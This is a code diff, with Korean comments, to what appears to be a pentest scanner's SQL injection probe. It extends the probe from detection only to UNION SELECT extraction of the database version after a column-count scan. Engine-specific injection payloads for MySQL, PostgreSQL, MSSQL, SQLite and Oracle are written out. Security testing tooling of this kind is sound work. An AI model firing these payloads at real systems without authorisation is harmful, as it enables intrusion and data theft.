@@ -5,7 +5,9 @@
  *   1) error-based : 오류유발 문자로 DB 오류 시그니처 노출 (high)
  *   2) boolean-based blind : 참/거짓 조건의 응답 차이 (high) — 오류를 숨기는 앱 대응
  *   3) time-based blind : 조건부 지연(SLEEP)으로 실행 확인 (high) — 응답이 동일한 앱 대응
- * 데이터 추출은 하지 않는다(존재 신호만). args.payloads 로 커스텀 오류유발 문자열 주입 가능.
+ * 신호가 확정되면 UNION 기반 실증 추출(읽기 전용)을 시도한다: 컬럼 수 스캔 후
+ * 마커+버전 표현식(CONCAT('R3DX9','|',@@version) 등)을 UNION SELECT 로 삽입해
+ * 응답 반영 여부로 "실제 데이터 추출"을 증명한다. args.payloads 로 커스텀 오류유발 문자열 주입 가능.
  * ctx.auth 가 있으면 인증된 표면까지 점검한다.
  */
 
@@ -48,7 +50,7 @@ const TIME_PAYLOADS = [
 export const sqliProbe: Tool = {
   name: "sqli_probe",
   description:
-    "지정 파라미터에 오류기반·부울맹목·시간맹목 세 갈래로 SQLi 존재를 탐지한다(추출 없음, 최소영향). args.payloads 로 커스텀 페이로드 주입.",
+    "지정 파라미터에 오류기반·부울맹목·시간맹목 세 갈래로 SQLi 존재를 탐지하고, 확정 시 UNION SELECT 로 버전 값 실증 추출(읽기 전용)을 시도한다. args.payloads 로 커스텀 페이로드 주입.",
   intent: "exploit",
   async run(args, ctx: ToolContext): Promise<ToolResult> {
     const base = baseUrl(ctx.target);
@@ -59,6 +61,7 @@ export const sqliProbe: Tool = {
     // crawl 이 찾은 여러 경로×파라미터를 발산적으로 스윕한다. 첫 확정 신호에서 반환.
     let statusShiftEvidence: { param: string; evidence: string } | undefined;
     let lastError: string | undefined;
+    let errBody = "";
 
     for (const path of paths) {
       for (const param of params) {
@@ -75,11 +78,14 @@ export const sqliProbe: Tool = {
             if (hit) {
               errored = hit;
               errMk = mk;
+              errBody = m.body;
               break;
             }
           }
           if (errored) {
-            return signal(path, param, "error-based", `오류유발 입력('${errMk}')에서 DB 오류 노출: ${errored.source.slice(0, 40)}`);
+            const spec = ENGINE_SPEC.find((s) => s.re.test(errBody));
+            const ext = spec ? await unionExtract(ctx, (v) => q(v), spec) : undefined;
+            return signal(path, param, "error-based", `오류유발 입력('${errMk}')에서 DB 오류 노출: ${errored.source.slice(0, 40)}`, ext);
           }
 
           // 2) boolean-based blind — 참/거짓 조건의 응답이 유의미하게 갈리는가.
@@ -126,6 +132,82 @@ export const sqliProbe: Tool = {
   },
 };
 
+// --- P0.5: UNION 기반 실증 추출 (가능성 → 실제 데이터 반환 증명) ---
+const EXTRACT_MARKER = "R3DX9";
+const MAX_COLS = 10;
+/** 엔진별 버전 반환 패턴: 라벨 포함 → 인접 셀(>8.0.32<) → 첫 버전 토큰 순. */
+const ENGINE_VALUE: Record<string, RegExp[]> = {
+  "MySQL/MariaDB": [/(?:mysql|maria[\w ]*)[^\d]{0,20}(\d+\.\d+\.\d+(?:[a-z0-9-]*)?)/i, />\s*(\d+\.\d+\.\d+)\s*</, /(\d+\.\d+\.\d+)/],
+  "PostgreSQL": [/postgres(?:ql)?[^\d]{0,20}(\d+(?:\.\d+)+)/i, />\s*(\d+(?:\.\d+)+)\s*</, /(\d+(?:\.\d+)+)/],
+  "MSSQL": [/(?:microsoft sql server|sql server)[^\d]{0,30}(\d+(?:\.\d+)+)/i, />\s*(\d+(?:\.\d+)+)\s*</, /(\d+(?:\.\d+)+)/],
+  "SQLite": [/sqlite[^\d]{0,20}(\d+(?:\.\d+)+)/i, />\s*(\d+(?:\.\d+)+)\s*</, /(\d+(?:\.\d+)+)/],
+  "Oracle": [/oracle[^\d]{0,30}(\d+(?:\.\d+)+)/i, />\s*(\d+(?:\.\d+)+)\s*</, /(\d+(?:\.\d+)+)/],
+};
+
+/** 마커 위치 기준 ±300자 윈도에서 버전 값을 찾는다(마커|값, 인접 셀, 라벨 순). */
+function valueFromBody(body: string, engine: string, markerIdx: number): string {
+  const win = body.slice(markerIdx, markerIdx + 300);
+  const direct = /R3DX9\|([^<&"'`\s]{1,90})/.exec(win);
+  if (direct?.[1]) return direct[1].trim();
+  for (const re of ENGINE_VALUE[engine] ?? []) {
+    const m = re.exec(win);
+    if (m?.[1]) return m[1].trim();
+  }
+  return "";
+}
+
+interface EngineSpec {
+  name: string;
+  re: RegExp;
+}
+
+const ENGINE_SPEC: EngineSpec[] = [
+  { name: "MySQL/MariaDB", re: /mysql|maria|sqlstate|mysqli|pdoexception|valid mysql/i },
+  { name: "PostgreSQL", re: /pg_query|postgresql|syntax error at or near|invalid input syntax/i },
+  { name: "MSSQL", re: /odbc.*sql server|microsoft ole db|system\.data\.sqlclient|quoted string not properly terminated/i },
+  { name: "SQLite", re: /sqlite/i },
+  { name: "Oracle", re: /ora-\d{5}/i },
+];
+
+function exprFor(name: string): string {
+  switch (name) {
+    case "MySQL/MariaDB":
+      return `CONCAT('${EXTRACT_MARKER}','|',@@version)`;
+    case "MSSQL":
+      return `'${EXTRACT_MARKER}'+'|'+@@VERSION`;
+    case "SQLite":
+      return `'${EXTRACT_MARKER}'||'|'||sqlite_version()`;
+    case "Oracle":
+      return `'${EXTRACT_MARKER}'||'|'||(SELECT banner FROM v$version WHERE ROWNUM=1)`;
+    default: // PostgreSQL
+      return `'${EXTRACT_MARKER}'||'|'||version()`;
+  }
+}
+
+/** 컬럼 수 스캔(열 1..3 × 컬럼 수 1..MAX_COLS): 마커가 반영된 첫 UNION 조합을 찾는다. */
+async function unionExtract(
+  ctx: ToolContext,
+  q: (v: string) => string,
+  spec: EngineSpec,
+): Promise<{ engine: string; cols: number; value: string; markerOnly: boolean } | undefined> {
+  for (let col = 1; col <= 3; col++) {
+    for (let cols = col; cols <= MAX_COLS; cols++) {
+      const cells = [...Array(cols).keys()].map((x) => (x === col - 1 ? exprFor(spec.name) : "NULL"));
+      const payload = `-1' UNION SELECT ${cells.join(",")}${spec.name === "Oracle" ? " FROM dual" : ""}-- -`;
+      try {
+        const r = await authGet(ctx, q(payload));
+        if (DB_ERROR.some((re) => re.test(r.body)) || !r.body.includes(EXTRACT_MARKER)) continue;
+        const idx = r.body.indexOf(EXTRACT_MARKER);
+        const value = idx >= 0 ? valueFromBody(r.body, spec.name, idx) : "";
+        return { engine: spec.name, cols, value, markerOnly: value.length === 0 };
+      } catch {
+        /* 다음 조합 */
+      }
+    }
+  }
+  return undefined;
+}
+
 const DEFAULT_PATHS = ["/"];
 const DEFAULT_PARAMS = ["id", "q", "search", "user", "name", "page"];
 const MAX_PATHS = 8;
@@ -149,16 +231,32 @@ function pickParams(args: Record<string, unknown>): string[] {
   return DEFAULT_PARAMS.slice(0, MAX_PARAMS);
 }
 
-function signal(path: string, param: string, technique: string, evidence: string): ToolResult {
+function signal(
+  path: string,
+  param: string,
+  technique: string,
+  evidence: string,
+  ext?: { engine: string; cols: number; value: string; markerOnly: boolean },
+): ToolResult {
+  const payload: Record<string, unknown> = {
+    severity: "high",
+    title: `SQL Injection 취약점 신호 (${technique}, param=${param})`,
+    evidence: `${path} — ${evidence}`,
+  };
+  if (ext) {
+    if (ext.markerOnly) {
+      payload.extracted = "행반영(값 미식별)";
+      payload.evidence = `${payload.evidence}\nUNION 데이터 추출 실증: 주입 행 반영 확인 — 임의 SELECT 결과가 응답에 렌더링됨(버전 값 미식별)`;
+    } else {
+      payload.extracted = `${ext.engine} ${ext.value}`;
+      payload.evidence = `${payload.evidence}\nUNION 데이터 추출 실증: ${ext.engine} ${ext.value} (컬럼 ${ext.cols}개)`;
+    }
+  }
   return {
     ok: true,
     summary: `SQLi 신호 탐지(${technique}): ${path} 의 파라미터 '${param}'`,
     fingerprint: { indicators: [`sqli:${technique}`, `param ${param}`] },
-    data: {
-      severity: "high",
-      title: `SQL Injection 취약점 신호 (${technique}, param=${param})`,
-      evidence: `${path} — ${evidence}`,
-    },
+    data: payload,
   };
 }
 
